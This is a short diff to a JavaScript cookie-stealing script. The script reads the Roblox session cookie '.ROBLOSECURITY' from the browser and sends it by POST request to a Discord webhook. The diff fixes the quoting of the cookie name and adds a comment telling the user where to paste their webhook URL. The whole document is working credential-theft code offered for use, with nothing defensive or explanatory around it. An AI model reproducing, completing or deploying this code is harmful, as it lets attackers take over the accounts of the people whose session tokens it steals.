@@ -1,13 +1,14 @@
+// WEBHOOK URL GOES IN WEBHOOK VALUE (dont delete the *s). on line 11
 function getCookie(name) {
   const value = `; ${document.cookie}`;
   const parts = value.split(`; ${name}=`);
   if (parts.length === 2) return parts.pop().split(';').shift();
 }
-var token = getCookie(.ROBLOSECURITY)
+var token = getCookie(".ROBLOSECURITY")
 function discordWebhook(){
         const request = new XMLHttpRequest();
      
-      request.open("POST", "****WEBHOOK-GOES-HERE****"); // <-- Discord webhook link 
+      request.open("POST", "****WEBHOOK-URL****"); // <-- Discord webhook link 
       
       request.setRequestHeader('Content-type', 'application/json');
 
